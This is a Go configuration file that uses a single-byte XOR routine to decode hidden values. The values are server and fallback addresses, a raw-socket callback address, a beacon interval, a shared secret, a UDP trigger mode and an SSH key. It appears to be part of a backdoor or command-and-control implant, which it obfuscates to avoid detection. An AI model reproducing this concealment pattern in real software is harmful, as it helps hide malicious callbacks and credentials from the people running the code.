package config

var (
	DefaultServer   = ""
	FallbackServer  = ""
	RawsockCBAddr   = ""
	KCCAddr         = ""
	DefaultInterval = "30s"
	SharedSecret    = ""
	TriggerMode     = "udp"
	SSHKey          = ""
)

func init() {
	if v := xd(_sv); v != "" {
		DefaultServer = v
	}
	if v := xd(_fb); v != "" {
		FallbackServer = v
	}
	if v := xd(_rb); v != "" {
		RawsockCBAddr = v
	}
	if v := xd(_kc); v != "" {
		KCCAddr = v
	}
	if v := xd(_iv); v != "" {
		DefaultInterval = v
	}
	if v := xd(_sk); v != "" {
		SharedSecret = v
	}
	if v := xd(_tr); v != "" {
		TriggerMode = v
	}
	if v := xd(_kp); v != "" {
		SSHKey = v
	}
}

func xd(s string) string {
	if s == "" {
		return ""
	}
	b := make([]byte, len(s))
	for i := range s {
		b[i] = s[i] ^ 0x5A
	}
	return string(b)
}
